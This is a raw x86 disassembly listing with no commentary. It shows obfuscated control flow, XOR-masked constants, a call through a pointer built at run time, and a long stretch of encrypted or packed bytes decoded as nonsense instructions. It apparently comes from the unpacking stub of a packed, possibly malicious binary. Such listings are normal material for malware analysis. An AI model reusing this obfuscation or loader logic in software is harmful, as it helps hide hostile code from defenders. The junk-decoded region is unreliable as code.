  4154b5:	dec    edx
  4154b6:	mov    DWORD PTR ds:0x42a88d,edx
  4154bc:	jmp    0x41545d
  4154c1:	mov    edx,DWORD PTR ds:0x42a7b9
  4154c7:	and    edx,DWORD PTR ds:0x42a84d
  4154cd:	mov    DWORD PTR ds:0x42a7b9,edx
  4154d3:	mov    ecx,DWORD PTR [ebp-0x4]
  4154d6:	and    DWORD PTR ds:0x42a781,0x65ac
  4154e0:	mov    edx,DWORD PTR [ebp-0x4]
  4154e3:	add    DWORD PTR ds:0x42a835,0x42a7f1
  4154ed:	xor    edx,esi
  4154ef:	xor    DWORD PTR ds:0x42a835,0x571
  4154f9:	xor    ecx,esi
  4154fb:	add    ecx,edx
  4154fd:	mov    edx,DWORD PTR [ebp-0x4]
  415500:	xor    eax,esi
  415502:	or     DWORD PTR ds:0x42a7c5,0x42a805
  41550c:	xor    edx,esi
  41550e:	add    eax,edi
  415510:	lea    ecx,[ecx+edx*1+0x9757c8]
  415517:	mov    DWORD PTR ds:0x42a7f5,0x1d99
  415521:	mov    DWORD PTR [ebp-0x20],eax
  415524:	mov    DWORD PTR ds:0x42a761,0x9d6
  41552e:	cmp    eax,ecx
  415530:	ja     0x415630
  415536:	jmp    0x415589
  41553b:	and    DWORD PTR ds:0x42a7bd,0x0
  415545:	mov    ecx,DWORD PTR ds:0x42a7bd
  41554b:	inc    ecx
  41554c:	mov    DWORD PTR ds:0x42a7bd,ecx
  415552:	cmp    DWORD PTR ds:0x42a7bd,0x21
  415559:	jne    0x415577
  41555f:	push   DWORD PTR [ebp-0x14]
  415562:	push   0x42a845
  415567:	push   0x6e14
  41556c:	push   0x8733
  415571:	call   DWORD PTR ds:0x41d104
  415577:	cmp    DWORD PTR ds:0x42a7bd,0x12
  41557e:	jb     0x415545
  415584:	sbb    eax,ecx
  415586:	mov    eax,DWORD PTR [ebp-0x20]
  415589:	and    DWORD PTR ds:0x42a87d,0x0
  415593:	jmp    0x4155a7
  415598:	xor    ecx,ecx
  41559a:	add    ecx,DWORD PTR ds:0x42a87d
  4155a0:	inc    ecx
  4155a1:	mov    DWORD PTR ds:0x42a87d,ecx
  4155a7:	cmp    DWORD PTR ds:0x42a87d,0x1c
  4155ae:	jae    0x4155d4
  4155b4:	cmp    DWORD PTR ds:0x42a87d,0x21
  4155bb:	jne    0x4155cf
  4155c1:	push   0x6aa9
  4155c6:	push   DWORD PTR [ebp-0x24]
  4155c9:	call   DWORD PTR ds:0x41d108
  4155cf:	jmp    0x415598
  4155d4:	mov    ecx,DWORD PTR [ebp-0x4]
  4155d7:	xor    ecx,esi
  4155d9:	lea    eax,[ecx+eax*1+0x327298]
  4155e0:	push   eax
  4155e1:	mov    eax,DWORD PTR [ebp-0x14]
  4155e4:	xor    eax,esi
  4155e6:	lea    eax,[ebp+eax*1+0x3272a0]
  4155ed:	push   eax
  4155ee:	mov    eax,ds:0x41eae6
  4155f3:	push   DWORD PTR [eax+0x1bc]
  4155f9:	call   0x4043a1
  4155fe:	mov    eax,DWORD PTR [ebp-0x4]
  415601:	mov    ecx,DWORD PTR [ebp-0x20]
  415604:	xor    eax,esi
  415606:	lea    eax,[ecx+eax*1+0x327298]
  41560d:	mov    ecx,DWORD PTR [ebp-0x4]
  415610:	mov    edx,DWORD PTR [ebp-0x4]
  415613:	xor    edx,esi
  415615:	xor    ecx,esi
  415617:	add    ecx,edx
  415619:	mov    edx,DWORD PTR [ebp-0x4]
  41561c:	xor    edx,esi
  41561e:	lea    ecx,[ecx+edx*1+0x9757c8]
  415625:	mov    DWORD PTR [ebp-0x20],eax
  415628:	cmp    eax,ecx
  41562a:	jbe    0x41553b
  415630:	mov    eax,DWORD PTR [ebp+0xc]
  415633:	mov    ds:0x41e96a,eax
  415638:	mov    eax,DWORD PTR [ebp+0x10]
  41563b:	mov    ds:0x41ebbe,eax
  415640:	mov    eax,ds:0x41e96a
  415645:	mov    ecx,DWORD PTR [ebp-0x18]
  415648:	push   DWORD PTR [ebp-0x44]
  41564b:	sub    eax,edi
  41564d:	push   DWORD PTR [ebp-0x30]
  415650:	xor    eax,esi
  415652:	mov    DWORD PTR [ecx],eax
  415654:	push   DWORD PTR [ebp-0x2c]
  415657:	call   0x41594a
  41565c:	sub    eax,edi
  41565e:	xor    eax,esi
  415660:	mov    DWORD PTR [ebp+0xc],eax
  415663:	mov    ecx,DWORD PTR [ebp-0x4]
  415666:	mov    eax,DWORD PTR [ebp+0xc]
  415669:	xor    ecx,esi
  41566b:	add    ecx,edi
  41566d:	xor    edx,edx
  41566f:	div    ecx
  415671:	mov    ecx,DWORD PTR [ebp-0x24]
  415674:	cmp    ecx,eax
  415676:	jne    0x41589f
  41567c:	mov    eax,ds:0x41eae6
  415681:	mov    DWORD PTR [ebp+0x10],eax
  415684:	mov    eax,ds:0x41ebf6
  415689:	mov    DWORD PTR [ebp-0x50],eax
  41568c:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  415693:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  41569a:	mov    DWORD PTR [ebp-0x4c],0xf89cb538
  4156a1:	mov    DWORD PTR [ebp-0x64],0xf89f0538
  4156a8:	mov    DWORD PTR [ebp-0x60],0xf89c85f8
  4156af:	mov    DWORD PTR [ebp-0x54],0xf89c85d8
  4156b6:	mov    eax,DWORD PTR [ebp-0x18]
  4156b9:	xor    eax,esi
  4156bb:	add    eax,edi
  4156bd:	mov    DWORD PTR [ebp-0xc],eax
  4156c0:	mov    DWORD PTR [ebp-0x3c],0xf89c853d
  4156c7:	mov    BYTE PTR [ebp-0x25],0x67
  4156cb:	mov    eax,DWORD PTR [ebp-0x18]
  4156ce:	xor    eax,esi
  4156d0:	add    eax,edi
  4156d2:	mov    DWORD PTR [ebp-0xc],eax
  4156d5:	mov    eax,DWORD PTR [ebp-0x54]
  4156d8:	xor    eax,esi
  4156da:	add    eax,edi
  4156dc:	mov    DWORD PTR [ebp-0x40],eax
  4156df:	mov    eax,DWORD PTR [ebp-0x4c]
  4156e2:	xor    eax,esi
  4156e4:	add    eax,edi
  4156e6:	mov    DWORD PTR [ebp-0x38],eax
  4156e9:	mov    eax,DWORD PTR [ebp-0x3c]
  4156ec:	xor    eax,esi
  4156ee:	add    eax,edi
  4156f0:	mov    DWORD PTR [ebp-0x34],eax
  4156f3:	lea    eax,[ebp-0xa8]
  4156f9:	mov    DWORD PTR [ebp+0xc],eax
  4156fc:	mov    eax,DWORD PTR [ebp-0x18]
  4156ff:	mov    DWORD PTR [ebp-0x14],eax
  415702:	mov    eax,DWORD PTR [ebp-0x20]
  415705:	mov    DWORD PTR [ebp-0x5c],ebx
  415708:	mov    DWORD PTR [ebp-0x10],eax
  41570b:	mov    eax,DWORD PTR [ebp-0x5c]
  41570e:	mov    ecx,DWORD PTR [ebp+0xc]
  415711:	xor    eax,esi
  415713:	add    eax,0x327298
  415718:	mov    DWORD PTR [ecx],eax
  41571a:	mov    eax,DWORD PTR [ebp-0x14]
  41571d:	mov    ecx,DWORD PTR [ebp+0xc]
  415720:	xor    eax,esi
  415722:	add    eax,edi
  415724:	mov    DWORD PTR [ecx+0x4],eax
  415727:	mov    eax,DWORD PTR [ebp-0x34]
  41572a:	mov    ecx,DWORD PTR [ebp+0xc]
  41572d:	mov    DWORD PTR [ecx+0x8],eax
  415730:	mov    eax,DWORD PTR [ebp-0x38]
  415733:	mov    ecx,DWORD PTR [ebp+0xc]
  415736:	mov    DWORD PTR [ecx+0xc],eax
  415739:	mov    eax,DWORD PTR [ebp-0x40]
  41573c:	mov    ecx,DWORD PTR [ebp+0xc]
  41573f:	mov    DWORD PTR [ecx+0x10],eax
  415742:	mov    eax,eax
  415744:	mov    eax,DWORD PTR [ebp-0x10]
  415747:	xor    eax,esi
  415749:	add    eax,edi
  41574b:	je     0x41577c
  415751:	lea    eax,[ebp-0xa8]
  415757:	push   eax
  415758:	mov    eax,DWORD PTR [ebp-0x20]
  41575b:	xor    eax,esi
  41575d:	add    eax,edi
  41575f:	push   eax
  415760:	mov    eax,DWORD PTR [ebp+0x10]
  415763:	add    eax,0xaa
  415768:	push   eax
  415769:	mov    eax,DWORD PTR [ebp+0x10]
  41576c:	mov    eax,DWORD PTR [eax+0x198]
  415772:	push   DWORD PTR [eax]
  415774:	call   0x419198
  415779:	mov    DWORD PTR [ebp-0x8],eax
  41577c:	cmp    DWORD PTR [ebp-0x8],0x0
  415780:	je     0x41589f
  415786:	lea    eax,[ebp-0xc]
  415789:	mov    DWORD PTR [ebp-0x38],eax
  41578c:	mov    eax,DWORD PTR [ebp-0x60]
  41578f:	xor    eax,esi
  415791:	add    eax,edi
  415793:	mov    DWORD PTR [ebp-0x40],eax
  415796:	mov    eax,DWORD PTR [ebp-0x3c]
  415799:	xor    eax,esi
  41579b:	add    eax,edi
  41579d:	mov    DWORD PTR [ebp-0x10],eax
  4157a0:	mov    eax,DWORD PTR [ebp-0x8]
  4157a3:	mov    DWORD PTR [ebp-0x14],eax
  4157a6:	lea    eax,[ebp-0xa8]
  4157ac:	mov    DWORD PTR [ebp+0xc],eax
  4157af:	mov    eax,DWORD PTR [ebp-0x18]
  4157b2:	mov    DWORD PTR [ebp-0x18],eax
  4157b5:	mov    eax,DWORD PTR [ebp-0x20]
  4157b8:	mov    DWORD PTR [ebp-0x48],ebx
  4157bb:	mov    DWORD PTR [ebp-0x34],eax
  4157be:	mov    eax,DWORD PTR [ebp-0x48]
  4157c1:	mov    ecx,DWORD PTR [ebp+0xc]
  4157c4:	xor    eax,esi
  4157c6:	add    eax,0x327298
  4157cb:	mov    DWORD PTR [ecx],eax
  4157cd:	mov    eax,DWORD PTR [ebp-0x14]
  4157d0:	mov    ecx,DWORD PTR [ebp+0xc]
  4157d3:	mov    DWORD PTR [ecx+0x4],eax
  4157d6:	mov    eax,DWORD PTR [ebp-0x10]
  4157d9:	mov    ecx,DWORD PTR [ebp+0xc]
  4157dc:	mov    DWORD PTR [ecx+0x8],eax
  4157df:	mov    eax,DWORD PTR [ebp-0x40]
  4157e2:	mov    ecx,DWORD PTR [ebp+0xc]
  4157e5:	mov    DWORD PTR [ecx+0xc],eax
  4157e8:	mov    eax,DWORD PTR [ebp-0x38]
  4157eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4157ee:	mov    DWORD PTR [ecx+0x10],eax
  4157f1:	mov    eax,eax
  4157f3:	mov    eax,DWORD PTR [ebp-0x14]
  4157f6:	test   eax,eax
  4157f8:	mov    eax,DWORD PTR [ebp-0x34]
  4157fb:	jne    0x415804
  415801:	mov    eax,DWORD PTR [ebp-0x18]
  415804:	xor    eax,esi
  415806:	add    eax,edi
  415808:	test   eax,eax
  41580a:	je     0x415838
  415810:	lea    eax,[ebp-0xa8]
  415816:	push   eax
  415817:	mov    eax,DWORD PTR [ebp-0x20]
  41581a:	xor    eax,esi
  41581c:	add    eax,edi
  41581e:	push   eax
  41581f:	mov    eax,DWORD PTR [ebp+0x10]
  415822:	add    eax,0xee
  415827:	push   eax
  415828:	mov    eax,DWORD PTR [ebp+0x10]
  41582b:	mov    eax,DWORD PTR [eax+0x198]
  415831:	push   DWORD PTR [eax]
  415833:	call   0x419198
  415838:	mov    ecx,DWORD PTR [ebp-0x3c]
  41583b:	xor    ecx,esi
  41583d:	mov    eax,0xffcd8d68
  415842:	sub    eax,ecx
  415844:	sub    eax,DWORD PTR [ebp-0x8]
  415847:	mov    ecx,DWORD PTR [ebp-0x50]
  41584a:	add    ecx,eax
  41584c:	mov    eax,DWORD PTR [ebp-0x8]
  41584f:	mov    DWORD PTR [eax+0x1],ecx
  415852:	mov    al,BYTE PTR [ebp-0x25]
  415855:	mov    ecx,DWORD PTR [ebp-0x8]
  415858:	xor    al,0x43
  41585a:	sub    al,0x3b
  41585c:	mov    BYTE PTR [ecx],al
  41585e:	lea    eax,[ebp-0x8]
  415861:	inc    BYTE PTR [eax]
  415863:	inc    eax
  415864:	push   eax
  415865:	pop    ecx
  415866:	dec    ecx
  415867:	xchg   ecx,edx
  415869:	dec    BYTE PTR [edx]
  41586b:	push   DWORD PTR [ebp+0x10]
  41586e:	mov    eax,ds:0x41eba2
  415873:	mov    eax,DWORD PTR [eax]
  415875:	push   DWORD PTR [eax]
  415877:	lea    eax,ds:0x41ebbe
  41587d:	push   DWORD PTR [eax]
  41587f:	lea    eax,ds:0x41e96a
  415885:	push   DWORD PTR [eax]
  415887:	lea    eax,ds:0x41eb9e
  41588d:	push   DWORD PTR [eax]
  41588f:	lea    eax,ds:0x41ec46
  415895:	push   DWORD PTR [eax]
  415897:	xchg   ebx,edx
  415899:	inc    ebx
  41589a:	push   ebx
  41589b:	pop    eax
  41589c:	call   DWORD PTR [eax-0x1]
  41589f:	lea    eax,[ebp+0x4]
  4158a2:	mov    DWORD PTR [ebp-0x58],eax
  4158a5:	mov    eax,ds:0x41eae6
  4158aa:	push   0x4
  4158ac:	add    eax,0x1cc
  4158b1:	push   eax
  4158b2:	lea    eax,[ebp-0x1c]
  4158b5:	push   eax
  4158b6:	call   0x4043a1
  4158bb:	mov    eax,DWORD PTR [ebp-0x1c]
  4158be:	mov    eax,DWORD PTR [ebp-0x4]
  4158c1:	mov    eax,DWORD PTR [ebp-0x24]
  4158c4:	mov    DWORD PTR [ebp+0xc],eax
  4158c7:	mov    eax,ds:0x41eb6a
  4158cc:	mov    ecx,DWORD PTR [ebp+0xc]
  4158cf:	sub    eax,edi
  4158d1:	xor    eax,esi
  4158d3:	cmp    eax,ecx
  4158d5:	je     0x41591c
  4158db:	mov    eax,ds:0x41eb62
  4158e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4158e3:	sub    eax,edi
  4158e5:	xor    eax,esi
  4158e7:	cmp    eax,ecx
  4158e9:	jne    0x4158ff
  4158ef:	mov    eax,ds:0x41eb6a
  4158f4:	add    eax,DWORD PTR ds:0x41eb62
  4158fa:	jmp    0x415906
  4158ff:	mov    eax,DWORD PTR [ebp+0xc]
  415902:	xor    eax,esi
  415904:	add    eax,edi
  415906:	mov    ds:0x41eb62,eax
  41590b:	mov    eax,DWORD PTR [ebp+0xc]
  41590e:	xor    eax,esi
  415910:	add    eax,edi
  415912:	mov    ds:0x41eb6a,eax
  415917:	jmp    0x415926
  41591c:	mov    eax,ds:0x41eb6a
  415921:	mov    ds:0x41eb62,eax
  415926:	mov    eax,DWORD PTR [ebp-0x58]
  415929:	mov    ecx,DWORD PTR ds:0x41eb62
  41592f:	add    DWORD PTR [eax],ecx
  415931:	push   0x10
  415933:	push   0x41ebfe
  415938:	call   DWORD PTR ds:0x41d114
  41593e:	mov    eax,DWORD PTR [ebp-0x1c]
  415941:	mov    eax,DWORD PTR [eax]
  415943:	pop    edi
  415944:	pop    esi
  415945:	pop    ebx
  415946:	leave  
  415947:	ret    0xc
  41594a:	push   ebp
  41594b:	mov    ebp,esp
  41594d:	jmp    0x415c05
  415952:	into   
  415953:	int    0xc5
  415955:	rol    ebp,1
  415957:	(bad)  
  415959:	shl    eax,1
  41595b:	out    0x8f,al
  41595d:	stc    
  41595e:	test   eax,0x6da2952e
  415963:	adc    BYTE PTR [edi+0x78],bh
  415966:	xchg   ebp,eax
  415967:	jle    0x4159e1
  415969:	js     0x415961
  41596b:	pop    eax
  41596c:	mov    ds:0x3b4da92e,eax
  415971:	imul   al
  415973:	pop    ebx
  415974:	or     bh,BYTE PTR [edi-0x61]
  415977:	fdivrp st(3),st
  415979:	jge    0x4159a3
  41597b:	jmp    0x415944
  41597d:	and    BYTE PTR [eax-0x169e6b7a],bl
  415983:	push   ss
  415984:	mov    edi,DWORD PTR [esi-0x4820d1dc]
  41598a:	jne    0x41594c
  41598c:	jbe    0x415983
  41598e:	mov    edx,0x35616e91
  415993:	add    eax,0xfd8bea80
  415998:	lea    eax,[esi+0x4e]
  41599b:	xor    BYTE PTR [edi+ebp*4],dh
  41599e:	retf   
  41599f:	dec    ebp
  4159a0:	mov    ebx,0xebb208d7
  4159a5:	scas   eax,DWORD PTR es:[edi]
  4159a6:	out    0x5d,al
  4159a8:	jno    0x415932
  4159aa:	(bad)  
  4159ac:	leave  
  4159ad:	mov    dl,0xa0
  4159af:	(bad)  
  4159b0:	or     esi,DWORD PTR [ecx-0x4b983e98]
  4159b6:	xchg   ebx,eax
  4159b7:	dec    ecx
  4159b8:	xlat   BYTE PTR ds:[ebx]
  4159b9:	leave  
  4159ba:	jnp    0x4159f8
  4159bc:	inc    edx
  4159bd:	lahf   
  4159be:	sti    
  4159bf:	and    BYTE PTR [ebp+0xbea54c6],bl
  4159c5:	add    esp,DWORD PTR [ecx-0x2d3ed2f]
  4159cb:	ja     0x4159a9
  4159cd:	mov    ebp,0x8612c47e
  4159d2:	adc    al,0x80
  4159d4:	add    dh,ah
  4159d6:	add    BYTE PTR [eax],ch
  4159d8:	cli    
  4159d9:	or     al,0x95
  4159db:	push   0x62
  4159dd:	pop    ebp
  4159de:	adc    bl,cl
  4159e0:	dec    esp
  4159e1:	sbb    BYTE PTR [eax-0x5f81a537],cl
  4159e7:	popa   
  4159e8:	cwde   
  4159e9:	inc    eax
  4159ea:	daa    
  4159eb:	jne    0x4159fc
  4159ed:	xchg   edx,eax
  4159ee:	cmp    ch,BYTE PTR [ebx-0x71a52325]
  4159f4:	jmp    0x34560f5d
  4159f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159fa:	mov    ebx,0xf4dccd50
  4159ff:	test   BYTE PTR [eax+eiz*1],dl
  415a02:	mov    ah,BYTE PTR [edi-0x49]
  415a05:	in     al,0x66
  415a07:	in     al,0xc9
  415a09:	fwait
  415a0a:	jae    0x415a0f
  415a0c:	fsubr  QWORD PTR [ebx-0x21]
  415a0f:	jne    0x415a51
  415a11:	inc    ebp
  415a12:	nop
  415a13:	jns    0x415a29
  415a15:	in     al,0xbe
  415a17:	pop    ecx
  415a18:	xchg   edx,eax
  415a19:	adc    eax,0x154399d2
  415a1e:	iret   
  415a1f:	adc    al,0x8d
  415a21:	jp     0x415a95
  415a23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a24:	push   0x71bc6b74
  415a29:	inc    ecx
  415a2a:	pop    edi
  415a2b:	or     edi,DWORD PTR [ebx-0x36]
  415a2e:	test   DWORD PTR [edi],ecx
  415a30:	js     0x415a86
  415a32:	dec    esp
  415a33:	inc    edx
  415a34:	outs   dx,BYTE PTR ds:[esi]
  415a35:	sub    eax,0x765e25da
  415a3a:	mov    edx,0x8fa8c000
  415a3f:	jns    0x415a09
  415a41:	inc    edx
  415a42:	or     dl,BYTE PTR [ebx+0x58]
  415a45:	jnp    0x415a44
  415a47:	mov    ds:0xf1e08c6d,al
  415a4c:	add    dl,bl
  415a4e:	or     BYTE PTR [ecx],cl
  415a50:	rcl    BYTE PTR [ecx+ebx*8],0x9e
  415a54:	adc    al,0x39
  415a56:	sbb    al,0x5a
  415a58:	xchg   ebp,eax
  415a59:	daa    
  415a5a:	loope  0x415a35
  415a5c:	scas   eax,DWORD PTR es:[edi]
  415a5d:	or     BYTE PTR [ebp+0x7f],0xb4
  415a61:	jmp    0x554bb964
  415a66:	in     eax,dx
  415a67:	imul   edi,ebp,0x1
  415a6a:	mov    ch,0xce
  415a6c:	mov    ebx,0xa4175d20
  415a71:	pushf  
  415a72:	push   eax
  415a73:	or     DWORD PTR [esi-0x37],0xffffffc4
  415a77:	sub    esp,DWORD PTR [edx]
  415a79:	ror    BYTE PTR [ebx],1
  415a7b:	fidiv  WORD PTR [ebp+0x3388a0c2]
  415a81:	inc    ecx
  415a82:	outs   dx,DWORD PTR ds:[esi]
  415a83:	push   0xffffffb1
  415a85:	loop   0x415aed
  415a87:	into   
  415a88:	push   ebx
  415a89:	pop    ebx
  415a8a:	add    al,0xf1
  415a8c:	or     al,0x80
  415a8e:	jp     0x415a2c
  415a90:	imul   ebx,DWORD PTR [edi-0x39],0x26ce9c85
  415a97:	add    al,0xc4
  415a99:	jmp    0x415a62
  415a9b:	sub    al,0x80
  415a9d:	add    DWORD PTR [eax-0x2c41b734],0xffffffe7
  415aa4:	cmp    edx,edx
  415aa6:	jnp    0x415ab8
  415aa8:	add    ebx,DWORD PTR [ebx+ebx*8-0x58585964]
  415aaf:	sub    DWORD PTR [ecx-0x4b98726],ebx
  415ab5:	inc    ecx
  415ab6:	mov    ds:0x4d3bcc12,eax
  415abb:	pop    ebx
  415abc:	adc    al,0x45
  415abe:	aaa    
  415abf:	mov    WORD PTR [edx+eiz*1+0xf418373],es
  415ac6:	push   ebp
  415ac7:	pop    esp
  415ac8:	add    bl,BYTE PTR [ecx+0x35916326]
  415ace:	jns    0x415aa7
  415ad0:	dec    edi
  415ad1:	data16 ja 0x415b3e
  415ad4:	mov    al,ds:0xc9026b75
  415ad9:	xchg   ebx,eax
  415ada:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415adb:	jb     0x415a70
  415add:	ds inc eax
  415adf:	(bad)  
  415ae0:	fcmovne st,st(4)
  415ae2:	push   cs
  415ae3:	shr    DWORD PTR [ebx],0xcc
  415ae6:	mov    edi,0x7391eba9
  415aeb:	jmp    0xfe0b:0xef82b1b0
  415af2:	xchg   esi,eax
  415af3:	pop    edi
  415af4:	fcmove st,st(3)
  415af6:	into   
  415af7:	repz test eax,0x3a688469
  415afd:	stos   DWORD PTR es:[edi],eax
  415afe:	int3   
  415aff:	shl    eax,cl
  415b01:	fbstp  TBYTE PTR [ecx]
  415b03:	iret   
  415b04:	pop    es
  415b05:	lds    ecx,FWORD PTR [ebx+0x2d]
  415b08:	repz cdq 
  415b0a:	shr    dh,cl
  415b0c:	mov    al,ds:0x3b0f5626
  415b11:	sti    
  415b12:	aaa    
  415b13:	ret    
  415b14:	add    al,0xdc
  415b16:	jne    0x415b11
  415b18:	mov    esi,0x60789fd
  415b1d:	and    BYTE PTR [edx],dh
  415b1f:	aad    0x71
  415b21:	imul   DWORD PTR [ecx]
  415b23:	mov    ebx,0xf8c0b2c7
  415b28:	dec    esi
  415b29:	cwde   
  415b2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b2b:	mov    ebx,0xf6e3447f
  415b30:	jbe    0x415b3f
  415b32:	mov    esp,0xb54beb96
  415b37:	dec    esp
  415b38:	loopne 0x415b03
  415b3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b3b:	add    BYTE PTR [eax+0x3e1b1ed3],dh
  415b41:	out    dx,al
  415b42:	stos   DWORD PTR es:[edi],eax
  415b43:	jle    0x415adb
  415b45:	cdq    
  415b46:	repz in eax,dx
  415b48:	mov    edx,0x39b3847
  415b4d:	lock add bh,ah
  415b50:	aam    0x86
  415b52:	sbb    esi,edx
  415b54:	mov    bh,0xa7
  415b56:	lock ss into 
  415b59:	test   BYTE PTR [ebp-0x6b],al
  415b5c:	repz scas al,BYTE PTR es:[edi]
  415b5e:	cli    
  415b5f:	dec    esi
  415b60:	xor    cl,cl
  415b62:	mov    ebp,0xffe0cdec
  415b67:	outs   dx,DWORD PTR ds:[esi]
  415b68:	pop    ds
  415b69:	mov    ch,0x3a
  415b6b:	test   al,0xbd
  415b6d:	add    al,0xd3
  415b6f:	(bad)  
  415b71:	inc    edx
  415b72:	xor    al,0x98
  415b74:	(bad)  
  415b75:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  415b77:	jnp    0x415b85
  415b79:	cmc    
  415b7a:	inc    edi
  415b7b:	fbld   TBYTE PTR [edx-0x35]
  415b7e:	lahf   
  415b7f:	out    0x84,eax
  415b81:	adc    BYTE PTR ds:0x131121a3,cl
  415b87:	data16 mov dh,0xe2
  415b8a:	sub    dl,BYTE PTR [eax+0x31]
  415b8d:	(bad)  
  415b8e:	test   eax,0xcc9a4edf
  415b93:	xlat   BYTE PTR ds:[ebx]
  415b94:	push   cs
  415b95:	jg     0x415c13
  415b97:	or     BYTE PTR [esi],ch
  415b99:	mov    al,ds:0xfff430e6
  415b9e:	jg     0x415b97
  415ba0:	mov    eax,ds:0x71900166
  415ba5:	data16 xor bh,BYTE PTR [edi+0x6b]
  415ba9:	mov    esi,ecx
  415bab:	iret   
  415bac:	xchg   edi,eax
  415bad:	sub    eax,0xa3bdbc6b
  415bb2:	mov    al,0x98
  415bb4:	adc    eax,0xf64f77ab
  415bb9:	loopne 0x415bb7
  415bbb:	jne    0x415c1f
  415bbd:	jl     0x415beb
  415bbf:	(bad)  
  415bc0:	and    BYTE PTR [edi+0x51],dl
  415bc3:	mov    eax,ds:0x17465861
  415bc8:	cmp    al,0x31
  415bca:	adc    al,0x80
  415bcc:	dec    esi
  415bcd:	or     ah,ch
  415bcf:	call   FWORD PTR [esp+edi*2-0x23f4de1]
  415bd6:	call   0xdccc71ee
  415bdb:	xchg   DWORD PTR [ebp-0x1f431e76],ebp
  415be1:	enter  0x9067,0x2b
  415be5:	xchg   DWORD PTR [eax],ebp
  415be7:	ret    0x38ca
  415bea:	jbe    0x415b83
  415bec:	sti    
  415bed:	push   esi
  415bee:	mov    ah,0xc7
  415bf0:	arpl   WORD PTR [ecx-0x72],sp
  415bf3:	sar    DWORD PTR [ebp+0x27915075],1
  415bf9:	mov    dh,0x59
  415bfb:	or     al,0x96
  415bfd:	xor    eax,esi
  415bff:	push   es
  415c00:	jnp    0x415c5d
  415c02:	clc    
  415c03:	cmp    BYTE PTR [edx+0x5c75151],dh
  415c09:	cmc    
  415c0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c0b:	inc    edx
  415c0c:	add    BYTE PTR [eax],dl
  415c0e:	adc    BYTE PTR [eax],al
  415c10:	add    BYTE PTR [eax-0x7637ac7],bh
  415c16:	mov    DWORD PTR ds:0x42a7b9,0x4c90
  415c20:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  415c27:	mov    DWORD PTR ds:0x42a87d,edx
  415c2d:	push   esi
  415c2e:	jmp    0x415ee6
  415c33:	retf   0xd7d6
  415c36:	xlat   BYTE PTR ds:[ebx]
  415c37:	fcmovnbe st,st(5)
  415c39:	retf   0xa0d9
  415c3c:	test   al,0x64
  415c3e:	pop    ecx
  415c3f:	repz sub ch,BYTE PTR [eax+0x54]
  415c43:	mov    dl,BYTE PTR ds:0x7e95787f
  415c49:	js     0x415cc3
  415c4b:	fs inc eax
  415c4d:	imul   ebx,DWORD PTR [ecx-0x3d67c122],0x833b7de2
  415c57:	ret    0xb125
  415c5a:	ja     0x415c94
  415c5c:	out    0xac,eax
  415c5e:	dec    edi
  415c5f:	pop    ebx
  415c60:	cmp    ch,BYTE PTR [eax-0x7e]
  415c63:	imul   BYTE PTR [ecx-0x10fb8e89]
  415c69:	jl     0x415c3b
  415c6b:	sub    ebp,DWORD PTR [ebx-0x6232bb1f]
  415c71:	sub    eax,0x11158ecc
  415c76:	cmp    BYTE PTR [ebx],dl
  415c78:	cmp    eax,0x23baf099
  415c7d:	adc    edx,DWORD PTR [edi+edi*1+0x77]
  415c81:	call   0x613161ec
  415c86:	js     0x415c99
  415c88:	(bad)  
  415c89:	jo     0x415cea
  415c8b:	imul   esp,DWORD PTR [edi+0x79511143],0x5caeaec4
  415c95:	add    DWORD PTR [ecx-0x6e],ebp
  415c98:	mov    esp,0xecb51764
  415c9d:	mov    bl,0xd4
  415c9f:	test   eax,0x2aa7f0dc
  415ca4:	pop    esi
  415ca5:	pushf  
  415ca6:	test   al,0xfa
  415ca8:	xlat   BYTE PTR ds:[ebx]
  415ca9:	call   0x2219:0xd7334df7
  415cb0:	cwde   
  415cb1:	mov    esp,0xbb48a220
  415cb6:	retf   
  415cb7:	imul   ah
  415cb9:	popa   
  415cba:	sbb    edx,DWORD PTR [ebx]
  415cbc:	cmp    ebx,0x96a4f973
  415cc2:	adc    DWORD PTR [ecx-0x2],ebx
  415cc5:	fwait
  415cc6:	test   al,0x51
  415cc8:	hlt    
  415cc9:	test   dh,al
  415ccb:	push   esi
  415ccc:	cmp    ebp,DWORD PTR [esi]
  415cce:	dec    esi
  415ccf:	je     0x415ce1
  415cd1:	mov    ebx,0x461f020d
  415cd6:	xor    eax,0x54444217
  415cdb:	scas   al,BYTE PTR es:[edi]
  415cdc:	add    DWORD PTR [esi-0x740f2e98],edx
  415ce2:	jg     0x415d0e
  415ce4:	stos   BYTE PTR es:[edi],al
  415ce5:	call   0xe7ec:0x7b2381b3
  415cec:	test   al,0x8c
  415cee:	in     al,0xe8
  415cf0:	dec    ecx
  415cf1:	popa   
  415cf2:	mov    al,0x9b
  415cf4:	dec    edx
  415cf5:	sbb    eax,0x329d1a62
  415cfa:	cmp    al,0xa4
  415cfd:	cli    
  415cfe:	inc    edx
  415cff:	ins    DWORD PTR es:[edi],dx
  415d00:	jl     0x415d18
  415d02:	cld    
  415d03:	mov    DWORD PTR [esi],ecx
  415d05:	push   esi
  415d06:	sub    DWORD PTR [eax],ecx
  415d08:	outs   dx,BYTE PTR ds:[esi]
  415d09:	jbe    0x415d18
  415d0b:	ret    0x92aa
  415d0e:	popa   
  415d0f:	outs   dx,DWORD PTR ds:[esi]
  415d10:	and    eax,0x905cd831
  415d15:	mov    ebx,0x9d809909
  415d1a:	in     al,dx
  415d1b:	pop    ebx
  415d1c:	adc    BYTE PTR [edi],ch
  415d1e:	lahf   
  415d1f:	fst    DWORD PTR [edi]
  415d21:	dec    ecx
  415d22:	repnz push ebx
  415d24:	cwde   
  415d25:	outs   dx,DWORD PTR ds:[esi]
  415d26:	mov    bl,0xec
  415d28:	clc    
  415d29:	jae    0x415d30
  415d2b:	jbe    0x415cf8
  415d2d:	stos   DWORD PTR es:[edi],eax
  415d2e:	xor    al,0x1
  415d30:	pop    esi
  415d31:	push   esi
  415d32:	cs pop ebx
  415d34:	ins    BYTE PTR es:[edi],dx
